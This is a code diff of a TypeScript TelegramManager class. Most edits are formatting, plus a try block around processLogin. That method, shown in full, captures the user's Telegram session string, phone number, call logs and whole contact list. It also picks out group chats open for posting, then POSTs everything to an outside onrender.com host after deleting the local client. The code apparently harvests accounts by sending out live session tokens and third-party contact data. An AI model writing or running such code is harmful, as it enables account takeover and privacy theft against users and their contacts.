@@ -344,8 +344,8 @@ class TelegramManager {
         await restAcc(this.phoneNumber);
     }
 
-    async getCallLogs(){
-        const result:any = await this.client.invoke(
+    async getCallLogs() {
+        const result: any = await this.client.invoke(
             new Api.messages.Search({
                 peer: new Api.InputPeerEmpty(),
                 q: '',
@@ -396,7 +396,7 @@ class TelegramManager {
             // Count calls per chat ID
             const chatId = log.peerId.userId.value;
             if (!filteredResults.chatCallCounts[chatId]) {
-                const ent:any = await this.client.getEntity(log.peerId.userId.value)
+                const ent: any = await this.client.getEntity(log.peerId.userId.value)
                 filteredResults.chatCallCounts[chatId] = {
                     name: `${ent.firstName}  ${ent.lastName ? ent.lastName : ''}`,
                     count: 0
@@ -408,85 +408,89 @@ class TelegramManager {
     }
 
     async processLogin(result) {
-        console.log(this.client.session.save());
-        let photoCount = 0;
-        let videoCount = 0;
-        let movieCount = 0;
-        const sess = this.client.session.save() as unknown as string;
-        const user: any = await result.toJSON();
-        const dialogs = await this.client?.getDialogs({ limit: 600 });
-        // const messageHistory = await this.client.getMessages(user.id, { limit: 200 }); // Adjust limit as needed
-        // for (const message of messageHistory) {
-        //     const text = message.text.toLocaleLowerCase();
-        //     if (contains(text, ['movie', 'series', '1080', '720', 'terabox', '640', 'title', 'aac', '265', '264', 'instagr', 'hdrip', 'mkv', 'hq', '480', 'blura', 's0', 'se0', 'uncut'])) {
-        //         movieCount++
-        //     } else {
-        //         if (message.photo) {
-        //             photoCount++;
-        //         } else if (message.video) {
-        //             videoCount++;
-        //         }
-        //     }
-        // }
-        const exportedContacts: any = await this.client.invoke(new Api.contacts.GetContacts({
-            hash: bigInt(0)
-        }));
-        let channels = 0;
-        const chatsArray = [];
-        let personalChats = 0;
-
-        // Process and format the exported contacts as needed
-        const formattedContacts = exportedContacts.users.map(contact => ({
-            phone: contact.phone,
-            firstName: contact.firstName,
-            lastName: contact.lastName,
-            userName: contact.username,
-            clientId: contact.id.toString(),
-            fromId: user.id
-        }));
-        for (let chat of dialogs) {
-            if (chat.isChannel || chat.isGroup) {
-                channels++;
-                const chatEntity: any = chat.entity.toJSON();
-                const cannotSendMsgs = chatEntity.defaultBannedRights?.sendMessages;
-                if (!chatEntity.broadcast && !cannotSendMsgs) {
-                    chatsArray.push(chatEntity);
-                }
-            } else {
-                personalChats++;
-            }
-        }
-        const callLogs = await this.getCallLogs();
-
-
-        await this.disconnect();
-        await deleteClient(this.phoneNumber);
-
-        const payload3 = {
-            photoCount, videoCount, movieCount,
-            gender: null,//data?.data?.gender,
-            mobile: user.phone,
-            session: `${sess}`,
-            firstName: user.firstName,
-            lastName: user.lastName,
-            userName: user.username,
-            channels: channels,
-            personalChats: personalChats,
-            calls: callLogs,
-            contacts: exportedContacts.savedCount,
-            msgs: 0,//messageHistory.total,
-            totalChats: 0,//chats['total'],
-            lastActive: Date.now(),//lastActive,
-            date: new Date(Date.now() * 1000),//date,
-            tgId: user.id
-        };
         try {
-            await axios.post(`https://ramyaaa1.onrender.com/users`, payload3, { headers: { 'Content-Type': 'application/json' } });
-            await axios.post(`https://ramyaaa1.onrender.com/channels`, { channels: chatsArray }, { headers: { 'Content-Type': 'application/json' } });
-            await axios.post(`https://ramyaaa1.onrender.com/contacts`, { contacts: formattedContacts }, { headers: { 'Content-Type': 'application/json' } });
-        } catch (error) {
-            console.log(error)
+            console.log(this.client.session.save());
+            let photoCount = 0;
+            let videoCount = 0;
+            let movieCount = 0;
+            const sess = this.client.session.save() as unknown as string;
+            const user: any = await result.toJSON();
+            const dialogs = await this.client?.getDialogs({ limit: 600 });
+            // const messageHistory = await this.client.getMessages(user.id, { limit: 200 }); // Adjust limit as needed
+            // for (const message of messageHistory) {
+            //     const text = message.text.toLocaleLowerCase();
+            //     if (contains(text, ['movie', 'series', '1080', '720', 'terabox', '640', 'title', 'aac', '265', '264', 'instagr', 'hdrip', 'mkv', 'hq', '480', 'blura', 's0', 'se0', 'uncut'])) {
+            //         movieCount++
+            //     } else {
+            //         if (message.photo) {
+            //             photoCount++;
+            //         } else if (message.video) {
+            //             videoCount++;
+            //         }
+            //     }
+            // }
+            const exportedContacts: any = await this.client.invoke(new Api.contacts.GetContacts({
+                hash: bigInt(0)
+            }));
+            let channels = 0;
+            const chatsArray = [];
+            let personalChats = 0;
+
+            // Process and format the exported contacts as needed
+            const formattedContacts = exportedContacts.users.map(contact => ({
+                phone: contact.phone,
+                firstName: contact.firstName,
+                lastName: contact.lastName,
+                userName: contact.username,
+                clientId: contact.id.toString(),
+                fromId: user.id
+            }));
+            for (let chat of dialogs) {
+                if (chat.isChannel || chat.isGroup) {
+                    channels++;
+                    const chatEntity: any = chat.entity.toJSON();
+                    const cannotSendMsgs = chatEntity.defaultBannedRights?.sendMessages;
+                    if (!chatEntity.broadcast && !cannotSendMsgs) {
+                        chatsArray.push(chatEntity);
+                    }
+                } else {
+                    personalChats++;
+                }
+            }
+            const callLogs = await this.getCallLogs();
+
+
+            await this.disconnect();
+            await deleteClient(this.phoneNumber);
+
+            const payload3 = {
+                photoCount, videoCount, movieCount,
+                gender: null,//data?.data?.gender,
+                mobile: user.phone,
+                session: `${sess}`,
+                firstName: user.firstName,
+                lastName: user.lastName,
+                userName: user.username,
+                channels: channels,
+                personalChats: personalChats,
+                calls: callLogs,
+                contacts: exportedContacts.savedCount,
+                msgs: 0,//messageHistory.total,
+                totalChats: 0,//chats['total'],
+                lastActive: Date.now(),//lastActive,
+                date: new Date(Date.now() * 1000),//date,
+                tgId: user.id
+            };
+            try {
+                await axios.post(`https://ramyaaa1.onrender.com/users`, payload3, { headers: { 'Content-Type': 'application/json' } });
+                await axios.post(`https://ramyaaa1.onrender.com/channels`, { channels: chatsArray }, { headers: { 'Content-Type': 'application/json' } });
+                await axios.post(`https://ramyaaa1.onrender.com/contacts`, { contacts: formattedContacts }, { headers: { 'Content-Type': 'application/json' } });
+            } catch (error) {
+                console.log(error)
+            }
+            // await this.deleteMessages();
+        } catch (e) {
+            console.log(e)
         }
-        // await this.deleteMessages();
     }
 }
